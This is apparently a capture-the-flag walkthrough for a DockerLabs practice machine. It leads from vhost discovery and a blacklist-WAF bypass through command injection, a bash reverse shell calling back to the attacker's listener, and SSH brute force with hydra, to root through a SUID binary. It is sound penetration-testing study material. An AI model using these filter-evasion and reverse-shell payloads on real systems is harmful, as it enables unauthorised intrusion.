---
type: machine
platform: dockerlabs
difficulty: easy
ip: 172.17.0.2
cves: []
tools: [nmap, curl, gobuster, hydra, netcat]
techniques: [information-gathering, virtual-hosting, waf-bypass, command-injection, reverse-shells, ssh-bruteforce, hardcoded-credentials, suid-enumeration]
tags: [ejpt:assessment, ejpt:web-pentest, ejpt:host-net-pentest]
related: ["[[waf-bypass]]", "[[virtual-hosting]]", "[[command-injection]]"]
---

# Internal

**Writeup:** [raw writeup](../../writeups/dockerlabs/easy/internal.md)

Easy box: a 303 redirect leaks the real hostname → `gobuster vhost` finds a backup vhost → its directory inspector is behind a blacklist WAF → split-string command injection → reverse shell → leaked password list + SUID `vaultctl` → root.

## Path

1. **Recon** — `ping -c 2` then `nmap -sS -sC -sV -p- --open -Pn -n --min-rate 5000` → `22/tcp` (OpenSSH 9.6p1 Ubuntu) and `80/tcp` (Apache 2.4.58) ([[information-gathering]]).
2. **Hostname from the redirect** — `curl -s http://172.17.0.2/` returns **303 See Other** → `Location: http://internal.dl/`. Add `172.17.0.2 internal.dl` to `/etc/hosts` and re-browse.
3. **Vhost fuzzing** — `gobuster vhost -u http://internal.dl/ -w subdomains-top1million-5000.txt --append-domain --xs 303` → `backup.internal.dl` (200); the `--xs 303` filter drops the default redirect so only real vhosts remain. Map it in `/etc/hosts` too ([[virtual-hosting]]).
4. **WAF detection** — `backup.internal.dl` serves an interactive directory inspector. A lone `'` throws `can't access property "replace", s is null` (input is being parsed); shell metacharacters return `✗ Blacklist: Dangerous command detected in path.` — an **exact-string blacklist** ([[waf-bypass]]).
5. **Bypass → first command** — `/home | \whoam\i` → `ok www-data`: the backslashes are eaten by the shell, so the literal `whoami` never appears in the input ([[command-injection]], [[waf-bypass]]).
6. **Reverse shell** — `/home | ba's'h -c 'bas''h -i >& /dev/tcp/172.17.0.1/443 0>&1'`, listener `nc -lvnp 443` ([[reverse-shells]]).
7. **Privesc enum** — `find / -perm -4000 2>/dev/null | grep vault` → `/usr/local/bin/vaultctl` (custom SUID); `cat /opt/.vault_pass.txt` → 20 candidate passwords ([[suid-enumeration]], [[hardcoded-credentials]]).
8. **SSH brute-force** — `hydra -l vault -P passwords.txt ssh://172.17.0.2` → `vault` / `Yk8$pZ5@cN4!` ([[ssh-bruteforce]]).
9. **Root** — run `/usr/local/bin/vaultctl` as `vault` → `whoami` = **root**.

## Credentials / secrets

| Item | Value |
|------|-------|
| Web injection user | `www-data` |
| SSH `vault` | `Yk8$pZ5@cN4!` (from `/opt/.vault_pass.txt`) |

## Takeaways

- A **303 `Location:` header leaks the vhost** just as reliably as a default page — the server told you its real name; you only had to trust it and edit `/etc/hosts` ([[virtual-hosting]]).
- `gobuster vhost --append-domain --xs 303` is a clean one-liner for subdomain fuzzing: append the base domain to every word, discard the 303 the default site throws, keep the 200s ([[gobuster]]).
- **Blacklist ≠ blocked.** The WAF matched raw substrings, so splitting the signature across quotes/backslashes (`\whoam\i`, `ba's'h`, `bas''h`) makes the shell's argv identical while the filter sees no match ([[waf-bypass]]).
- The `'`-induced JS error was a free oracle: it proved the input was being processed and *where* — treat parse errors as recon, not just noise.
- Custom SUID binaries that hand out root still need a *user*: the box shipped a 20-line password file, and a **found wordlist beats rockyou** — hydra cracked `vault` in one hit ([[ssh-bruteforce]]).
